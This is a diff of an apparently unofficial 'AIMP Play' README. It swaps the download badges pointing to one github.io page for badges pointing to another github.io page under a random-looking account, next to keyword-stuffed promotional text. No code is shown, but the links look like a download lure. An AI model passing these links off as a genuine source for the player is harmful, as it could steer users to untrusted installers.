@@ -4,11 +4,7 @@
   <img src="https://play-lh.googleusercontent.com/qoT-GRwKWYjIHuQFCvLOMrcg9lav2YwJjBYiQ9E-6Tu7hpJGkE_AUkKLyIU0pB2Dn6s" alt="Program Logo"/>
 </div>
 
-<div align="center">
-
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://aimp-play.github.io/.github/)
-
-</div>
+[![GET AIMP Play](https://img.shields.io/badge/GET%20%E2%80%94%20AIMP-Play-0078D6?style=for-the-badge&logoColor=white)](https://shrdxp447296.github.io/.github/AIMP-Play)
 
 ---
 
@@ -32,11 +28,8 @@ Enterprise deployments benefit from aimp download distribution channels providin
   <img src="https://www.aimp.ru/v2/pages/features/afw_main-3.png" alt="AIMP Screenshot"/>
 </div>
 
-<div align="center">
+[![GET AIMP Play](https://img.shields.io/badge/GET%20%E2%80%94%20AIMP-Play-0078D6?style=for-the-badge&logoColor=white)](https://shrdxp447296.github.io/.github/AIMP-Play)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://aimp-play.github.io/.github/)
-
-</div>
 
 ---
 
